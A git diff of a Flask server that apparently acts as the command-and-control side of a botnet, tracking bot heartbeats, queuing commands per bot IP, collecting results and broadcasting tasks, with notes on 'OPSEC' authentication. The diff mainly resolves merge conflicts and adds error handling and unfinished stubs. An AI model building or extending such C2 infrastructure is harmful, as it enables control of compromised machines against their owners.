@@ -29,6 +29,28 @@ FIRSTCONTACTKEY = 'firstcontactkey'
 REGISTERKEY = 'registerkey'
 MASTERKEY = 'masterkey'
 
+# TODO: Implement this function 
+def postcheck(requestobj):
+    """
+    Description: Post check will see if the incoming post request from python flask 
+    has any errors or not. 
+
+    Params: 
+        - requestobj = Request object which comes from python flask 
+        - *args (or **kwargs) = number of parmeters that need to be checked 
+            - ex) 'firstcontactkey', 'user', 'ip'
+            - This dynamic argument will depend on endpoint to endpoint 
+
+    Return: 
+        - (json) errorstring = Error string wrapped around jsonify({'error': <error>})
+        - (bool) True = If everything is good, it's goodchie 
+
+    """
+
+    if request.method != 'POST':
+        return jsonify({'error': 'wrong HTTP method'})
+
+
 
 def init_db():
     db.drop_all()
@@ -55,18 +77,13 @@ def heartbeat():
 
     print("[DEBUG] user = ", user)
 
-<<<<<<< HEAD
-    # See if the bot exists, and if it does, update/refresh the timestamp of the bot.
-    query_bot = Bot.query.filter_by(ip=ip).filter_by(user=user).first()
-    query_bot.set_timestamp(datetime.now())
-=======
+    # See if the bot exists, and if it does, update and refresh the timestamp    
     try:
         query_bot = Bot.query.filter_by(ip=ip).filter_by(user=user).first()
         query_bot.set_timestamp(datetime.now())
 
     except Exception as e:
         return jsonify({'error': '[-] Heartbeat not available for you'})
->>>>>>> 2e1714a23ac780ae49abdc9fbf6ca448d10be42e
 
     return 'heartbeat'
 
@@ -232,10 +249,6 @@ def bottask(bot_ip):
         elif registerkey is None:
             return jsonify({'error': 'regsiterkey is required'})
 
-<<<<<<< HEAD
-        # Get the bot corresponding with the bot_ip 
-        query_bot = Bot.query.filter_by(ip=bot_ip).first()
-=======
         # Get the bot corresponding with the bot_ip
         try: 
             query_bot = Bot.query.filter_by(ip=bot_ip).first()
@@ -243,7 +256,6 @@ def bottask(bot_ip):
 
         except Exception as e:
             return jsonify({'error' : '[-] There are no commands for you'})
->>>>>>> 2e1714a23ac780ae49abdc9fbf6ca448d10be42e
 
         # Try getting commands, from the oldest staged command to the lastest staged command. 
         try:
@@ -315,12 +327,13 @@ def botresult(bot_ip):
     
 
 # TODO: Change to POST, implement master authentication for OPSEC 
-# TODO: Change the result to json, as an API endpoint 
+# TODO: Change the result to json, as this is an API endpoint 
 @app.route('/bot/list', methods=['GET'])
 def botlist():
     """
     Description: View and return all the bots in the server database
     TODO: Implement returning bot objects in json format 
+    TODO2: Implement filtering function - wait on this thought for now 
     """
 
     botlist = Bot.query.all()
@@ -391,6 +404,16 @@ def broadcast():
         return jsonify({ 'error': str(e) })
 
     return jsonify({ 'result': '[+] Broadcast successful' })
+
+
+# TODO: filer endpoint? Or just expand list endpoint to filter 
+# based on the POST request parameters ('find') ? 
+
+
+
+
+# ========================= Flask App Starts ======================
+
 
 init_db()
 
